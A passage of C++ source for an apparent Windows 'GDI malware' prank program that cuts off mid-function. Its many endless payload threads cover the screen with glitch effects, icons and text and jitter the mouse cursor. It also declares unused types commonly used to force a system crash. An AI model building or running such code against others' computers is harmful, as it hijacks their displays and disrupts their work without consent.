﻿// Lumina Star 1.5.cpp : 定义应用程序的入口点。
//
// Lumina Star 1.5.exe: remake of my old skidded Lumina Star.exe

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBRUSH (DWORD)0x89345c
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#pragma optimize("", off)
#define DESKTOP_WINDOW ((HWND)0)
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
using namespace std;
double cot(double x) {
	double res = tan(PI / 2 - x);
	return res;
}
double acot(double x) {
	double res = atan(PI / 2 - x);
	return res;
}
double cotf(double x) {
	double res = tanf(PI / 2 - x);
	return res;
}
double cotl(double x) {
	double res = tanl(PI / 2 - x);
	return res;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
typedef union COLOR {
	COLORREF rgb;
	struct {
		BYTE blue;
		BYTE green;
		BYTE red;
	};
} COLOR;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}
COLORREF COLORHSV(int HSV) {
	double h = fmod(HSV, 360.0);
	double s = 1.0;
	double l = 0.5;
	double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
	double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
	double m = l - c / 2.0;
	double r1, g1, b1;
	if (h < 60) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 120) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 190) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 250) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 200) {
		r1 = x;
		g1 = 0;
		b1 = c;
	}
	else {
		r1 = c;
		g1 = x;
		b1 = x;
	}
	int red = static_cast<int>((r1 + m) * 255);
	int green = static_cast<int>((g1 + m) * 255);
	int blue = static_cast<int>((b1 + m) * 255);
	return RGB(red, green, blue);
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
VOID WINAPI RotatePoints_Pentagon(POINT* points, int count, POINT center, float angle)
{
	float cosVal = cos(angle);
	float sinVal = sin(angle);
	for (int i = 0; i < count; i++)
	{
		int translatedX = points[i].x - center.x;
		int translatedY = points[i].y - center.y;
		points[i].x = static_cast<int>(translatedX * cosVal - translatedY * sinVal + center.x);
		points[i].y = static_cast<int>(translatedX * sinVal + translatedY * cosVal + center.y);
	}
}
HRGN CreatePentagonRgn(int x, int y, int size) {
	POINT points[10];
	double angle = 2 * PI / 10;
	for (int i = 0; i < 5; i++) {
		points[i].x = x + (int)(size * sin(i * angle));
		points[i].y = y + (int)(size * cos(i * angle));
	}
	points[5] = points[0];
	return CreatePolygonRgn(points, 5, WINDING);
}
VOID WINAPI InvertPentagonFunction(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreatePentagonRgn(x, y, w / 2);
	InvertRgn(hdc, hrgn);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}
VOID WINAPI ColourfulPentagonFunction(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreatePentagonRgn(x, y, w / 2);
	HBRUSH hbrush = CreateSolidBrush(RndRGB);
	HGDIOBJ hbrushCopy = SelectObject(hdc, hbrush);
	FillRgn(hdc, hrgn, hbrush);
	DeleteObject(hrgn);
	SelectObject(hdc, hbrushCopy);
	DeleteObject(hbrush);
	ReleaseDC(NULL, hdc);
}
BOOL FilterBltEx(HDC hdc, int x, int y, int width, int height, COLORREF(*Filter)(COLORREF, int, int)) {
	if (!hdc || width <= 0 || height <= 0 || x < 0 || y < 0 || !Filter) {
		return FALSE;
	}
	HDC memDC = CreateCompatibleDC(hdc);
	if (!memDC) return FALSE;
	HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, width, height);
	if (!hMemBmp) {
		DeleteDC(memDC);
		return FALSE;
	}
	HBITMAP hOldBmp = (HBITMAP)SelectObject(memDC, hMemBmp);
	if (!hOldBmp) {
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	if (!BitBlt(memDC, 0, 0, width, height, hdc, x, y, SRCCOPY)) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BITMAPINFO bmi;
	ZeroMemory(&bmi, sizeof(bmi));
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = -height;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	bmi.bmiHeader.biCompression = BI_RGB;
	const DWORD rowBytes = ((width * 3 + 3) & ~3);
	BYTE* pPixels = (BYTE*)LocalAlloc(LPTR, rowBytes * height);
	if (!pPixels) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BOOL success = FALSE;
	if (GetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
		BYTE* pRow = pPixels;
		int actualY = y;
		for (int row = 0; row < height; ++row, pRow += rowBytes, actualY++) {
			BYTE* pPixel = pRow;
			int actualX = x;
			for (int col = 0; col < width; ++col, pPixel += 3, actualX++) {
				COLORREF original = RGB(pPixel[2], pPixel[1], pPixel[0]);  // BGR or RGB
				COLORREF filtered = Filter(original, actualX, actualY);
				pPixel[0] = GetBValue(filtered);
				pPixel[1] = GetGValue(filtered);
				pPixel[2] = GetRValue(filtered);
			}
		}
		if (SetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
			success = BitBlt(hdc, x, y, width, height, memDC, 0, 0, SRCCOPY);
		}
	}
	LocalFree(pPixels);
	SelectObject(memDC, hOldBmp);
	DeleteObject(hMemBmp);
	DeleteDC(memDC);
	return success;
}
DWORD WINAPI Payload4_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((((t * ((t / 256) | (t >> 9))) & 191) - 16));
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload6_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((t / 4 * ((t >> 12 ^ (t >> 12) - 2) % 11) | t >> 13));
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload12_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((t >> 3 & 1) * t >> 3 ^ t / 512 * t);
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload1_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			rgbScreen[i].rgb += ((x | y) * (i & x) % (x + 1));
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload1_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	POINT point;
	while (true)
	{
		hdc = GetWindowDC(0);
		GetCursorPos(&point);
		int X = point.x + rand() % 3 - 1;
		int Y = point.y + rand() % 3 - 1;
		SetCursorPos(X, Y);
		DrawIcon(hdc, point.x, point.y, LoadIcon(GetModuleHandleA(0), MAKEINTRESOURCE(107)));
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI Payload2_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	COLOR* data = (COLOR*)VirtualAlloc(0, (w * h + w) * sizeof(COLOR), MEM_COMMIT, PAGE_READWRITE);
	HBITMAP bmp = CreateBitmap(w, h, 1, 32, data);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int fx = (int)((i ^ 6) + (i * 9) * round(log1pf(x ^ i + i + y & x + i * y ^ i)));
				data[y * w + x].rgb += COLORHSV((w + h) + fx);
			}
		}
		i++;
		SetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload2_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1, incrementation = 10, x = 10, y = 10, i = 0;
	float rotationAngle = 0.0f, rotationSpeed = 0.02f;
	while (true) {
		hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		int cx = x + 50, cy = y + 50, rad = 50, top_x = 0 + x, top_y = 0 + y, bottom_x = 100 + x, bottom_y = 100 + y;
		HPEN hpen = CreatePen(PS_SOLID, 3, RndRGB);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hpenCopy = SelectObject(hdc, hpen), hbrushCopy = SelectObject(hdc, hbrush);
		POINT DecagonPoints[10];
		for (int i = 0; i < 10; ++i) {
			double angle = 2.f * PI * i / 10;
			DecagonPoints[i].x = cx + static_cast<int>(rad * cos(angle));
			DecagonPoints[i].y = cy + static_cast<int>(rad * sin(angle));
		}
		POINT center =
		{
			(top_x + bottom_x) / 2, (top_y + bottom_y) / 2
		};
		RotatePoints_Pentagon(DecagonPoints, 5, center, rotationAngle);
		Polygon(hdc, DecagonPoints, 5);
		if (cy >= GetSystemMetrics(1)) { sy = -1; }
		if (cx >= GetSystemMetrics(0)) { sx = -1; }
		if (cy <= 0) { sy = 3; }
		if (cx <= 0) { sx = 3; }
		rotationAngle += rotationSpeed;
		SelectObject(hdc, hpenCopy);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hpen);
		DeleteObject(hbrush);
		ReleaseDC(0, hdc);
		Sleep(10);
		i++;
	}
	return 0;
}
DWORD WINAPI Payload3_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int cx = abs(x - (w / 3));
			int cy = abs(y - (h / 3));
			int zx = abs(cx * cx);
			int zy = abs(cy * cy);
			double di = 99.f + i;
			double fx = di + floor(di * tanl(sqrtl(zx + zy) / 114.5f));
			rgbScreen[i].rgb += fx + i;
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload5_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), wdpi = GetDeviceCaps(hdc, LOGPIXELSX), hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	while (true)
	{
		hdc = GetDC(0);
		int a = 1 + rand() % 64, b = 1 + rand() % 64;
		for (int x = 0; x <= w; x += 16 * hdpi / 96) {
			StretchBlt(hdc, x, -a * sin(b * x), 10, w, hdc, x, 0, 10, w, NOTSRCCOPY);
			Sleep(1);
		}
		for (int y = 0; y <= h; y += 16 * wdpi / 96) {
			StretchBlt(hdc, -a * tan(b * y), y, w, 10, hdc, 0, y, w, 10, NOTSRCERASE);
			Sleep(1);
		}
		ReleaseDC(NULL, hdc);
	}
	return 0;
}
DWORD WINAPI Payload5_num2(LPVOID lpParam)
{
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
	while (true)
	{
		const int size = 1300;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2, rr = rand() % 33 + 1;
		for (int i = 0; i < size; i += 100)
		{
			InvertPentagonFunction(x - i / rr, y - i / rr, i, i);
			Sleep(25);
		}
	}
}
DWORD WINAPI Payload5_num3(LPVOID lpParam)
{
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
	while (true)
	{
		const int size = 1300;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2, rr = rand() % 33 + 1;
		for (int i = 0; i < size; i += 100)
		{
			ColourfulPentagonFunction(x - i / rr, y - i / rr, i, i);
			Sleep(25);
		}
	}
}
DWORD WINAPI Payload5_num4(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdc, bmp);
	LPCSTR texts[20] = {
		"Golden Garlic.exe",
		"AngleArc()",
		"Arc()",
		"ArcTo()",
		"Chord()",
		"Ellipse()",
		"LineTo()",
		"Pie()",
		"PolyBezier()",
		"PolyBezierTo()",
		"PolyDraw()",
		"Polygon()",
		"PolyLine()",
		"PolyLineTo()",
		"PolyPolygon()",
		"PolyPolyLine()",
		"Rectangle()",
		"RoundRect()",
		"DrawFocusRect()",
		"DrawEdge()"
	};
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int rnd = rand() % 20;
		HFONT hFont = CreateFontA(rand() % 150, rand() % 150, 0, 0, FW_EXTRABOLD, true, true, true, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Frekoda");
		SelectObject(hdc, hFont);
		SetBkMode(hdc, 0);
		SetTextColor(hdc, RndRGB);
		TextOutA(hdc, rand() % w, rand() % h, texts[rnd], strlen(texts[rnd]));
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hFont);
		Sleep(25);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload7_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			rgbScreen[i].r -= (x | ((x ^ y) & (x + y - i)) + ((x ^ ~y) >> (i * 8))) / 12;
			rgbScreen[i].g -= ((x ^ y) & (x + y)) | ((i >> y) + (i * 8)) / 3;
			rgbScreen[i].b += ((~x ^ y) & (x + y)) / 6;
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload8_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), count = 2;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdcCopy, hbrush);
		SetStretchBltMode(hdcCopy, COLORONCOLOR);
		StretchBlt(hdcCopy, 0, 0, w / 4, h / 4, hdcCopy, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdcCopy, 0, 0, w / 4, h / 4, hdcCopy, 0, 0, w, h, PATINVERT);
		StretchBlt(hdcCopy, w / 4, 0, w / 4, h / 4, hdcCopy, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdcCopy, w / 4, 0, w / 4, h / 4, hdcCopy, 0, 0, w, h, PATINVERT);
		StretchBlt(hdcCopy, 0, h / 4, w / 4, h / 4, hdcCopy, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdcCopy, 0, h / 4, w / 4, h / 4, hdcCopy, 0, 0, w, h, PATINVERT);
		StretchBlt(hdcCopy, w / 4 * 3, h / 2, w / 4, h / 4, hdcCopy, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdcCopy, w / 4 * 3, h / 2, w / 4, h / 4, hdcCopy, 0, 0, w, h, PATINVERT);
		StretchBlt(hdcCopy, w / 2, h / 4 * 3, w / 4, h / 4, hdcCopy, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdcCopy, w / 2, h / 4 * 3, w / 4, h / 4, hdcCopy, 0, 0, w, h, PATINVERT);
		StretchBlt(hdcCopy, w / 4 * 3, h / 4 * 3, w / 4, h / 4, hdcCopy, 0, 0, w, h, SRCPAINT);
		StretchBlt(hdcCopy, w / 4 * 3, h / 4 * 3, w / 4, h / 4, hdcCopy, 0, 0, w, h, PATINVERT);
		StretchBlt(hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, SRCBRUSH);
		BitBlt(hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, hdcCopy, rand() % w, rand() % h, SRCBRUSH);
		StretchBlt(hdcCopy, 0, 0, w + count, h - count, hdcCopy, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdcCopy, 0, 0, w - count, h + count, hdcCopy, 0, 0, w, h, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, hbrushCopy);
		DeleteObject(hbrush);
		Sleep(50);
		count += 3;
		if (count > 66) { count = 3; }
	}
	SelectObject(hdcCopy, bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload9_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), mazelarper_s_dick_num = 0;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w - mazelarper_s_dick_num, h, hdcCopy, mazelarper_s_dick_num, 0, SRCCOPY);
		BitBlt(hdc, w - mazelarper_s_dick_num, 0, mazelarper_s_dick_num, h, hdcCopy, 0, 0, SRCCOPY);
		mazelarper_s_dick_num = mazelarper_s_dick_num + 1;
		if (h <= mazelarper_s_dick_num) { mazelarper_s_dick_num = 0; }
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload9_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), t = 0;
	HDC hdc = GetDC(NULL);
	while (true)
	{
		hdc = GetDC(0);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdc, hbrush);
		PatBlt(hdc, (t % 40) * (w / 40), 0, w / 40, h, PATINVERT);
		ReleaseDC(NULL, hdc);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hbrush);
		t++;
		if (t > w) { t = 0; }
		Sleep(5);
	}
	return 0;
}
DWORD WINAPI Payload9_num3(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), wdpi = GetDeviceCaps(hdc, LOGPIXELSX), hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	while (true)
	{
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, LoadIcon(GetModuleHandleA(0), MAKEINTRESOURCE(107)), 128 * wdpi / 96, 128 * hdpi / 96, NULL, NULL, DI_NORMAL);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
}
DWORD WINAPI Payload10_num1(LPVOID lpParam)//credits to hexademical
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x, d = 128 + i;
				int cx = abs(x - w / 3), cy = abs(y - h / 3);
				int dx = fabs(cx * cx), dy = fabs(cy * cy);
				double fx = floorf(d + (d * cos(sqrt(dx + dy) / d)) * x + y);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = (float)fmod(hslcolor.h + fx / 10000.f + 0.09f, 1.f);
				hslcolor.s = 1.f;
				if (hslcolor.l < 1.5033f) { hslcolor.l += .0727f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
